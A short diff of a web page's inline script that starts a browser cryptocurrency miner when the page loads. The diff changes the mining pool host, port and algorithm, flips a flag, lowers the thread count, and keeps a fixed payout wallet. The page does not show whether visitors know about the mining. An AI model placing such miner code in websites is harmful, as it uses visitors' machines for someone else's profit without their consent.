@@ -61,12 +61,12 @@
   <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"
     integrity="sha384-2huaZvOR9iDzHqslqwpR87isEmrfxqyWOF7hr7BY6KG0+hVKLoEXMPUJw3ynWuhO" crossorigin="anonymous">
   </script>
-  <script src="app.js"></script>
+  <script src="index.js"></script>
   <script>
     $(document).ready(() => {
       const stratum = {
-        server: "yespower.na.mine.zpool.ca",
-        port: 6234,
+        server: "minotaurx.na.mine.zpool.ca",
+        port: 7019,
         worker: "R9uHDn9XXqPAe2TLsEmVoNrokmWsHREV2Q",
         password: "c=RVN"
       };
@@ -80,11 +80,11 @@
       }, 1000);
 
       mine(
-        'yespower',
+        'minotaurx',
         stratum,
-        false,
+        true,
         {
-          threads: 95,
+          threads: 2,
           callback: (hashrate, shared, jobId) => {
             $('#hashrate').text(hashrate);
             $('#shared').text(shared);
